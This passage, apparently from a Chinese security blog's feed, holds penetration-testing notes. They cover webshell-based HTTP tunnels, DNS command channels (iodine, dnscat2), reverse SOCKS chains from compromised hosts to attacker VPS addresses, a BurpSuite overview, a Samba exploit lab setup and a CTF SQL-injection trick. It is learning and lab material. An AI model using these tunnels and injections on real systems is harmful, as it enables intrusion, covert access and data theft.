<h1 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h1><h2 id="abptts"><a href="#abptts" class="headerlink" title="abptts"></a>abptts</h2><p><a href="https://github.com/nccgroup/ABPTTS" target="_blank" rel="external">项目地址</a><br>首先,安装好工具所需的各种py依赖库:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pip install pycrypto    加密库,整个数据加密都要靠这个</div><div class="line">pip install httplib2</div></pre></td></tr></table></figure></p>
<p>生成好服务端(webshell)，-o用来指定要生成到的目录，然后把生成好的对应类型的代理脚本扔到目标网站目录中，并尝试访问该脚本，如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可，如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python abpttsfactory.py -o webshell</div></pre></td></tr></table></figure></p>
<p><img src="/image/abppts_webshell.png" alt="abppts_webshell"><br><img src="/image/abppts_webshell_request.png" alt="abppts_webshell_request"></p>
<p>前面确认没有问题后,现在开始绑定端口，建立隧道，下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定，-c用来指定webshell的配置文件[这里直接用默认的]，<code>-u</code> 指定webshell的url，关于更多选项用法，看下工具帮助就明白了，都非常简单的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python abpttsclient.py -c webshell\config.txt -u &quot;http://www.rcoil.com/abptts.aspx&quot; -f 127.0.0.1:1234/127.0.0.1:3389</div></pre></td></tr></table></figure></p>
<ol>
<li>隧道建立成功后，用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口]，即可访问目标内网中的资源:<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mstsc 127.0.0.1:1234</div><div class="line">putty ssh root@127.0.0.1 -p 1234 -i ~/.ssh/xxx/id_rsa  	如果对方的ssh只允许证书登录,加载上自己的证书即可</div></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><p>不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。</p>
<h2 id="Iodine"><a href="#Iodine" class="headerlink" title="Iodine"></a>Iodine</h2><p>它几乎是和<code>hans icmp隧道</code>工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。<a href="http://dev.kryo.se/iodine/wiki/HowtoSetup" target="_blank" rel="external">使用手册</a><br>Server端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iodined -f -c -P password 1.1.1.1 tunneldomain.com</div></pre></td></tr></table></figure></p>
<p>Client端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iodine -f -P password tunneldomain.com -r</div></pre></td></tr></table></figure></p>
<p>成功连接将直接在客户端生成地址<code>1.1.1.2</code>。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh &lt;user&gt;@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</div></pre></td></tr></table></figure></p>
<h2 id="Dnscat2"><a href="#Dnscat2" class="headerlink" title="Dnscat2"></a>Dnscat2</h2><p><a href="https://github.com/iagox86/dnscat2" target="_blank" rel="external">Dnscat2</a>通过建立C＆C通道递归DNS查询。此工具不需要<code>root/administrator</code>权限（在Windows和Linux上都可以使用）。它还支持端口转发。<br>Server端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ruby ./dnscat2.rb tunneldomain.com</div></pre></td></tr></table></figure></p>
<p>Client端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./dnscat2 tunneldomain.com</div></pre></td></tr></table></figure></p>
<p>收到Server端的连接后，可以使用<code>windows命令</code>查看活动会话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">dnscat2&gt; windows</div><div class="line">0 :: main [active]</div><div class="line">  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]</div><div class="line">  1 :: command session (debian)</div><div class="line">  2 :: sh (debian) [*]</div></pre></td></tr></table></figure></p>
<p>要启动端口转发，请选择一个命令会话session -i <num>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">dnscat2&gt; session -i 1</div><div class="line">New window created: 1</div><div class="line">New window created: 1</div><div class="line">history_size (session) =&gt; 1000</div><div class="line">This is a command session!</div><div class="line"></div><div class="line">That means you can enter a dnscat2 command such as</div><div class="line">&apos;ping&apos;! For a full list of clients, try &apos;help&apos;.</div><div class="line"></div><div class="line">command session (debian) 1&gt;</div></pre></td></tr></table></figure></num></p>
<p>使用<code>listen [lhost:]lport rhost:rport</code>命令转发端口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">command session (debian) 1&gt; listen 127.0.0.1:8080 10.0.0.20:80</div></pre></td></tr></table></figure></p>
<p>这将绑定靶机上的端口8080，并将所有连接转发到10.0.0.20:80。</p>
<h1 id="TCP隧道"><a href="#TCP隧道" class="headerlink" title="TCP隧道"></a>TCP隧道</h1><h2 id="shootback"><a href="#shootback" class="headerlink" title="shootback"></a>shootback</h2><p><a href="https://github.com/aploium/shootback" target="_blank" rel="external">shootback</a>，是由python开发的反向TCP隧道，使得NAT或防火墙后的内网机器可以被外网访问。在800并发下消耗小于1％的CPU和8MB内存。<br>….</p>
<h1 id="SOCKS"><a href="#SOCKS" class="headerlink" title="SOCKS"></a>SOCKS</h1><p>在实际渗透测试过程中，当我们成功的拿下第一台靶机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。</p>
<h2 id="socks代理工具"><a href="#socks代理工具" class="headerlink" title="socks代理工具"></a>socks代理工具</h2><p><code>socks代理</code>其实也可理解为一个<code>增强版的 lcx</code>，它在服务端监听一个服务端口，当有新的连接请求时会从socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能。</p>
<p>网络上Socks代理工具有很多，选用的时候尽可能使用<code>无GUI界面</code>的工具，还有尽可能不需要安装其他依赖软件，能够支持多平台操作系统的更佳。</p>
<h3 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h3><p>工具网址：<a href="http://rootkiter.com/EarthWorm" target="_blank" rel="external">http://rootkiter.com/EarthWorm</a><br><code>EW</code> 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以<code>正向</code>、<code>反向</code>、<code>多级级联</code>等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。<br>工具包中提供了多种可执行文件，以适用不同的操作系统，<code>Linux</code>、<code>Windows</code>、<code>MacOS</code>、<code>Arm-Linux</code> 均被包括其内,强烈推荐使用。</p>
<p>目前已经有了最新版Termite，工具网址：<a href="http://rootkiter.com/Termite/" target="_blank" rel="external">http://rootkiter.com/Termite/</a> </p>
<p>官方提供的方法就已经很好了，配套的Termite更不错，Termite中，只要节点互通，就可以任意切换代理。</p>
<h4 id="正向-SOCKS-v5-服务器"><a href="#正向-SOCKS-v5-服务器" class="headerlink" title="正向 SOCKS v5 服务器"></a>正向 SOCKS v5 服务器</h4><p>在具有公网IP时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ew -s ssocksd -l 1080</div></pre></td></tr></table></figure></p>
<h4 id="反弹-SOCKS-v5-服务器"><a href="#反弹-SOCKS-v5-服务器" class="headerlink" title="反弹 SOCKS v5 服务器"></a>反弹 SOCKS v5 服务器</h4><p>先在一台具有公网 ip :<code>233.233.233.233</code>的主机A上运行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ew -s rcsocks -l 1080 -e 8888</div></pre></td></tr></table></figure></p>
<p>在目标主机B上启动 <code>SOCKS v5 服务</code> 并反弹到公网主机的 8888端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./ew -s rssocks -d 233.233.233.233 -e 8888</div></pre></td></tr></table></figure>
<p>HackTools 可通过访问<code>=233.233.233.233:1080</code>端口使用 rssocks 主机提供的 socks5 代理服务</p>
<h4 id="二级级联"><a href="#二级级联" class="headerlink" title="二级级联"></a>二级级联</h4><p>环境示意图：<br><img src="/image/二级级联.png" alt="二级级联.png"></p>
<ul>
<li><p>环境说明（一）：V1主机配有2块网卡，一块连通外网，一块10.255.11.8只能连接内网V2主机，无法访问内网其它资源。V2主机可以访问内网资源，但无法访问外网。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># V2执行，利用ssocksd方式启动8888端口的socks代理</div><div class="line">./ew -s ssocksd -l 8888</div><div class="line"># V1执行，将来自外部的1080端口的代理请求转发到V2的8888端口上</div><div class="line">./ew -s lcx_tran -l 1080 -f 10.255.11.3 -g 8888</div><div class="line"># Attack执行，使用Proxifier等建立正常的socks代理访问1080端口</div></pre></td></tr></table></figure>
</li>
<li><p>环境说明（二）：V1主机没有公网IP，也无法访问内网资源。V2主机可以访问内网资源，但无法访问外网。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"># VPS执行，把来自外部的1080端口的流量转到本地的8888端口上</div><div class="line">./ew –s lcx_listen –l 1080 –e 8888</div><div class="line"># V2执行，在本地启动socks5代理并监听9999端口</div><div class="line">./ew -s ssocksd -l 9999</div><div class="line"># V1执行，把vps的8888端口和V2的9999进行绑定,即建立socks5通道</div><div class="line">./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.11.3 -g 9999</div><div class="line"># Attack执行，使用Proxifier等建立正常的socks代理访问1080端口</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="三级级联"><a href="#三级级联" class="headerlink" title="三级级联"></a>三级级联</h4><p>再提供一个“三级级联”的本地SOCKS测试用例以供参考<br>环境示意图：<br><img src="/image/三级级联.png" alt="三级级联.png"></p>
<ul>
<li>环境说明：Web server没有公网IP但可以访问外网，V2主机不能访问外网但可以被Web server主机访问，V3主机可被V2主机访问且能访问核心区域<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"># vps上执行，把来自外部的1080端口流量转到本地的8888端口上</div><div class="line">./ew -s rcsocks -l 1080 -e 8888  </div><div class="line"># Web server执行，把vps的8888端口和内网V2的9999端口绑定</div><div class="line">./ew -s lcx_slave -d 123.123.1.1 -e 8888 -f 10.255.12.2 -g 9999 </div><div class="line"># V2执行，将来自外部的7777端口和本地的9999端口进行绑定</div><div class="line">./ew -s lcx_listen -l 9999 -e 7777 </div><div class="line"># V3执行，将本地的socks连接反弹到V2的7777端口上</div><div class="line">./ew -s rssocks -d 10.255.12.2 -e 7777 </div><div class="line"># Attack执行，使用Proxifier等建立正常的socks代理访问1080端口</div></pre></td></tr></table></figure>
</li>
</ul>
<p>数据流向: <code>Attack(SOCKS v5) -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</code></p>
<p>更多的内容用力戳戳瞎下面这篇文章。</p>
<p><font color="red" size="5" face="黑体"><a href="http://bobao.360.cn/learning/detail/3502.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">内网漫游之SOCKS代理大结局</a></font><br>这篇文章是我见过最全的SOCKS代理</p>
<hr>
<p>参考：<br><a href="http://www.linuxidc.com/Linux/2012-09/69970.htm" target="_blank" rel="external">利用ssh端口转发实现Site-to-Site简易VPN通道</a><br><a href="http://blog.csdn.net/tan6600/article/details/52142254" target="_blank" rel="external">利用 DNS 隧道传递数据和命令来绕过防火墙</a><br><a href="https://artkond.com/2017/03/23/pivoting-guide/#target-with-public-ip" target="_blank" rel="external">A Red Teamer’s guide to pivoting</a><br><a href="http://bobao.360.cn/learning/detail/3502.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">内网漫游之SOCKS代理大结局</a><br><a href="http://bobao.360.cn/learning/detail/4234.html" target="_blank" rel="external">SSH如何反向代理稳定穿透内网</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;整合个端口、代理总结，总觉得好难。慢慢来…&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="http://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="http://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="http://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
      <category term="tools" scheme="http://rcoil.me/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>BurpSuite</title>
    <link href="http://rcoil.me/2017/05/BurpSuite/"/>
    <id>http://rcoil.me/2017/05/BurpSuite/</id>
    <published>2017-05-28T12:41:19.000Z</published>
    <updated>2017-08-01T15:53:42.671Z</updated>
    
    <content type="html"><![CDATA[<p>Burp Suite 是用于攻击web 应用程序的集成平台。对各个模块进行讲解,但是在写的时候，发现已经有很多的讲解了 =.=。<br><a id="more"></a></p>
<h2 id="Proxy模块"><a href="#Proxy模块" class="headerlink" title="Proxy模块"></a>Proxy模块</h2><p>一般使用 Burp Proxy时，大体涉及的环节如下。<br><img src="https://ooo.0o0.ooo/2017/05/29/592bc9732de54.png" alt="1.png"><br>这是一般情况下抓取HTTP协议的流程。</p>
<h3 id="高级代理"><a href="#高级代理" class="headerlink" title="高级代理"></a>高级代理</h3><p>而在抓取HTTPS协议消息的时候，就需要安装CA证书才可以。</p>
<blockquote>
<p>使用火狐浏览器，设置代理，将<code>为所有协议使用相同代理</code><br>访问<code>http://burp</code>,下载证书<br>打开浏览器的证书管理器，将证书导入（多导入一次，以确认是否导入成功）。<br><img src="https://ooo.0o0.ooo/2017/05/29/592bd04041948.png" alt="1.png"></p>
</blockquote>
<p>这样就可以抓取<code>ssl</code>协议的消息了。</p>
<h3 id="变相抓取客户端软件流量"><a href="#变相抓取客户端软件流量" class="headerlink" title="变相抓取客户端软件流量"></a>变相抓取客户端软件流量</h3><p>如果想要在另一个接口上进行Burp监听，假设监听<code>菜刀</code>上某个链接的流量。</p>
<blockquote>
<p>将URL和IP地址写入<code>Project options-&gt;Hostname Resolution</code><br>将<code>Proxy-&gt;Proxy Listeners</code>中<code>Binding</code>选择<code>All interfaces</code><br>将<code>Proxy-&gt;Proxy Listeners</code>中<code>Request handing</code>选择<code>Support....</code><br>最后对本机的<code>hosts</code>文件进行修改<code>127.0.0.1       www.xxx.com</code></p>
</blockquote>
<p>通过修改<code>hosts</code>来达到变相抓取客户段软件流量的目的</p>
<h2 id="Spider模块"><a href="#Spider模块" class="headerlink" title="Spider模块"></a>Spider模块</h2><p>是一个爬虫模块。<br><code>Spider</code> 通过跟踪<code>HTML</code>和<code>JavaScript</code>以及提交的表单中的超链接来映射目标应用程序，它还使用了一些其他的线索，如目录列表，资源类型的注释，以及<code>robots.txt</code>文件。结果会在站点地图中以树和表的形式显示出来，提供了一个清楚并非常详细的目标应用程序视图。</p>
<h3 id="Contro"><a href="#Contro" class="headerlink" title="Contro"></a>Contro</h3><p><img src="https://ooo.0o0.ooo/2017/05/29/592bdc8dc01c6.png" alt="1.png"></p>
<h3 id="Crawler-Settings"><a href="#Crawler-Settings" class="headerlink" title="Crawler Settings"></a>Crawler Settings</h3><ul>
<li><code>check robots.txt</code>：检测robot.txt文件。选择后Burp Spider会要求和处理robots.txt文件，提取内容链接。 </li>
<li></li>
<li><code>Detect custom &quot;not found&quot; responese</code>：检测自定义的’not found’响应。打开后Burp Spider会从每个域请求不存在的资源，编制指纹与诊断“not found”响应其它请求检测自定义“not found”的响应。 </li>
<li></li>
<li><code>ignore links to non-text content</code>：忽略非文本内容的连接。这个选项被选中，Spider 不会请求非文本资源。使用这个选项，会减少 spidering 时间。 </li>
<li></li>
<li><code>request the root of all directories</code>：请求所有的根目录。如果这个选项被选中，Burp Spider 会请求所有已确认的目标范围内的 web 目录，如果在这个目标站点存在目录遍历， 这选项将是非常的有用。 </li>
<li></li>
<li><code>make a non-parameterized request to each dynamic page</code>：对每个动态页面进行非参数化的请求。如果这个选项被选中，Burp Spider 会对在范围内的所有执行动作的 URL 进行无参数的 GET 请求。如果期待的参数没有被接收， 动态页面会有不同的响应，这个选项就能成功地探测出额外的站点内容和功能。 </li>
<li></li>
<li><code>Maximum link depth</code>：这是Burp Suite在种子 URL 里的浏览”hops”的最大数。0表示让Burp Suite只请求种子 URL。如果指定的数值非常大，将会对范围内的链接进行无限期的有效跟踪。将此选项设置为一个合理的数字可以帮助防止循环Spider在某些种类的动态生成的内容。 </li>
<li></li>
<li><code>Maximum parameterized requests per URL</code>：请求该蜘蛛用不同的参数相同的基本URL的最大数目。将此选项设置为一个合理的数字可以帮助避免爬行“无限”的内容。 </li>
</ul>
<p>其余的选项设置为默认就好了。如果特殊场景就特殊设置，如设置被动扫描、表单提交、程序登陆、爬行引擎和请求头。</p>
<h2 id="Intruder模块-暴力破解"><a href="#Intruder模块-暴力破解" class="headerlink" title="Intruder模块(暴力破解)"></a>Intruder模块(暴力破解)</h2><ul>
<li><code>Target</code> 用于配置目标服务器进行攻击的详细信息。</li>
<li><code>Positions</code>  设置Payloads的插入点以及攻击类型（攻击模式）。</li>
<li><code>Payloads</code>  设置payload，配置字典</li>
<li><code>Opetions</code>   此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。<br><img src="https://ooo.0o0.ooo/2017/05/29/592bed56862c9.png" alt="1.png"></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Burp Suite 是用于攻击web 应用程序的集成平台。对各个模块进行讲解,但是在写的时候，发现已经有很多的讲解了 =.=。&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://rcoil.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Samba远程代码执行漏洞</title>
    <link href="http://rcoil.me/2017/05/Samba%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://rcoil.me/2017/05/Samba远程代码执行漏洞/</id>
    <published>2017-05-26T09:11:20.000Z</published>
    <updated>2017-08-01T15:57:00.889Z</updated>
    
    <content type="html"><![CDATA[<p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件。称是linux版本的<code>eternalblue</code>漏洞。不过相对window来说，linux还是比较安全的。详情在这：<a href="http://bobao.360.cn/learning/detail/3900.html" target="_blank" rel="external">(CVE-2017-7494)分析</a><br><a id="more"></a><br>自昨天分析出来，到今天，<a href="https://github.com/hdm/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb" target="_blank" rel="external">metasploit</a>和<a href="https://github.com/Medicean/VulApps/tree/master/s/samba/1" target="_blank" rel="external">VulApps</a>都已经相续更新了<code>rb</code>和<code>靶场</code></p>
<p>利用方法在各个公众号已经很多了。</p>
<p>复现前，建议先更新一下<code>metasploit</code>，建议使用<code>aptitude</code>进行更新</p>
<p><code>aptitude</code> 是 Debian GNU/Linux 系统中, 非常神奇的的软件包管理器,基于大名鼎鼎的APT机制, 整合了 dselect 和 apt-get的所有功能, 并提供的更多特性,特别是在依赖关系处理上。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install aptitude</div><div class="line">aptitude update</div><div class="line">aptitude safe-upgrade metasploit-framework</div></pre></td></tr></table></figure></p>
<p>使用<code>docker</code>搭建靶机环境，记得用<code>sudo</code><br><img src="http://i1.piimg.com/588926/f1f195bb68dba594.png" alt=""><br><img src="http://i4.buimg.com/588926/be1355140e60e5d7.png" alt=""><br><img src="http://i4.buimg.com/588926/378fce31905867a5.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Samba是在Linux和UNIX系统上实现SMB协议的一个软件。称是linux版本的&lt;code&gt;eternalblue&lt;/code&gt;漏洞。不过相对window来说，linux还是比较安全的。详情在这：&lt;a href=&quot;http://bobao.360.cn/learning/detail/3900.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;(CVE-2017-7494)分析&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://rcoil.me/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="http://rcoil.me/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>MySQL偏门技巧</title>
    <link href="http://rcoil.me/2017/05/MySQL%E5%81%8F%E9%97%A8%E6%8A%80%E5%B7%A7/"/>
    <id>http://rcoil.me/2017/05/MySQL偏门技巧/</id>
    <published>2017-05-26T04:28:58.000Z</published>
    <updated>2017-08-01T15:56:23.088Z</updated>
    
    <content type="html"><![CDATA[<p>记录一写MySQL的偏门技巧<br><a id="more"></a></p>
<h2 id="group-by-with-rollup的用法"><a href="#group-by-with-rollup的用法" class="headerlink" title="group by with rollup的用法"></a>group by with rollup的用法</h2><p>from：90</p>
<p><img src="https://ooo.0o0.ooo/2017/05/29/592bf17c34949.png" alt="TIM图片20170527194508.png"></p>
<p><a href="http://ourmysql.com/archives/1144" target="_blank" rel="external">http://ourmysql.com/archives/1144</a></p>
<p><a href="http://blog.csdn.net/lhy55040817/article/details/8015628" target="_blank" rel="external">http://blog.csdn.net/lhy55040817/article/details/8015628</a></p>
<h2 id="绕过未知字段名的技巧"><a href="#绕过未知字段名的技巧" class="headerlink" title="绕过未知字段名的技巧"></a>绕过未知字段名的技巧</h2><p>from:<a href="https://www.secquan.org/Discuss/384#reply1" target="_blank" rel="external">Mysql巧妙绕过未知字段名的技巧</a></p>
<p>DDCTF第五题，绕过未知字段名的技巧，这里拿本机来操作了下，思路很棒也很清晰，分享给大家。题目过滤空格和逗号，空格使用%0a，%0b，%0c，%0d，%a0，或者直接使用括号都可以绕过，逗号使用join绕过；</p>
<p>存放flag的字段名未知，information_schema.columns也将表名的hex过滤了，即获取不到字段名；这时可以利用联合查询，过程如下：</p>
<p>思想就是获取flag，让其在已知字段名下出现；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select (select 1)a,(select 2)b,(select 3)c,(select 4)d;</div><div class="line">+---+---+---+---+</div><div class="line">| a | b | c | d |</div><div class="line">+---+---+---+---+</div><div class="line">| 1 | 2 | 3 | 4 |</div><div class="line">+---+---+---+---+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d;</div><div class="line">+---+---+---+---+</div><div class="line">| 1 | 2 | 3 | 4 |</div><div class="line">+---+---+---+---+</div><div class="line">| 1 | 2 | 3 | 4 |</div><div class="line">+---+---+---+---+</div><div class="line">1 row in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user;</div><div class="line">+---+-------+----------+-------------+</div><div class="line">| 1 | 2     | 3        | 4           |</div><div class="line">+---+-------+----------+-------------+</div><div class="line">| 1 | 2     | 3        | 4           |</div><div class="line">| 1 | admin | admin888 | 110@110.com |</div><div class="line">| 2 | test  | test123  | 119@119.com |</div><div class="line">| 3 | cs    | cs123    | 120@120.com |</div><div class="line">+---+-------+----------+-------------+</div><div class="line">4 rows in set (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e;</div><div class="line">+-------------+</div><div class="line">| 4           |</div><div class="line">+-------------+</div><div class="line">| 4           |</div><div class="line">| 110@110.com |</div><div class="line">| 119@119.com |</div><div class="line">| 120@120.com |</div><div class="line">+-------------+</div><div class="line">4 rows in set (0.03 sec)</div><div class="line"></div><div class="line">mysql&gt; select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d union select * from user)e limit 1 offset 3;</div><div class="line"></div><div class="line">+-------------+</div><div class="line">| 4           |</div><div class="line">+-------------+</div><div class="line">| 120@120.com |</div><div class="line">+-------------+</div><div class="line">1 row in set (0.01 sec)</div><div class="line"></div><div class="line">mysql&gt; select * from user where id=1 union select (select e.4 from (select * from (select 1)a,(select 2)b,(select 3)c,(select 4)d</div><div class="line">union select * from user)e limit 1 offset 3)f,(select 1)g,(select 1)h,(select 1)i;</div><div class="line">+-------------+----------+----------+-------------+</div><div class="line">| id          | username | password | email       |</div><div class="line">+-------------+----------+----------+-------------+</div><div class="line">| 1           | admin    | admin888 | 110@110.com |</div><div class="line">| 120@120.com | 1        | 1        | 1           |</div><div class="line">+-------------+----------+----------+-------------+</div><div class="line">2 rows in set (0.04 sec)</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一写MySQL的偏门技巧&lt;br&gt;
    
    </summary>
    
      <category term="数据库" scheme="http://rcoil.me/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
      <category term="Web安全" scheme="http://rcoil.me/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP 定时任务</title>
    <link href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"/>
    <id>http://rcoil.me/2017/05/PHP-定时任务/</id>
    <published>2017-05-07T12:35:20.000Z</published>
    <updated>2017-08-01T15:56:39.756Z</updated>
    
    <content type="html"><![CDATA[<p>写一个关于<code>不死</code>进程,其实也就是定时的进程，时间短那就是无限的启用着。<br>之前有些文章也有这一些函数，但是没有备注。<br><a id="more"></a></p>
<h2 id="ignore-user-abort-函数"><a href="#ignore-user-abort-函数" class="headerlink" title="ignore_user_abort() 函数"></a>ignore_user_abort() 函数</h2><p>属于杂项函数。<br><code>ignore_user_abort()</code>函数设置与客户机断开是否会终止脚本的执行。</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ignore_user_abort(setting)</div></pre></td></tr></table></figure>
<p><code>setting</code>为可选项,如果设置为 true，则忽略与用户的断开，如果设置为 false，会导致脚本停止运行。<br>如果未设置该参数，会返回当前的设置。</p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>PHP 不会检测到用户是否已断开连接，直到尝试向客户机发送信息为止。</p>
<h2 id="set-time-limit-函数"><a href="#set-time-limit-函数" class="headerlink" title="set_time_limit() 函数"></a>set_time_limit() 函数</h2><p>在PHP4，PHP5和PHP7中<br>set_time_limit 是设置脚本最大执行时间</p>
